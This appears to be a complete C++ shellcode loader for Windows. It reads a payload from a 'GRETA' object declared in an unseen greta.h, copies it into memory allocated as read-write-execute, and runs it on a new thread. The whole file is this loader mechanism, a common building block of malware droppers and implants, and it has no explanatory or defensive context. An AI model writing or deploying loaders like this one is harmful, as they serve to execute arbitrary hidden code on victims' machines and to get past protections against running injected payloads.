#include "greta.h"
#include <stdio.h>
#include <vector>
#include <windows.h>
int main()
{
	GRETA greta = Greta();

	if (!greta.bStatus)
	{
		return -1;
	}

	LPVOID pAddress = VirtualAlloc(nullptr, greta.payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlMoveMemory(pAddress, greta.payload.data(), greta.payload.size());

	HANDLE hThread = CreateThread(nullptr, greta.payload.size(), (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);

	WaitForSingleObject(hThread, INFINITE);
	
	return 0;
}
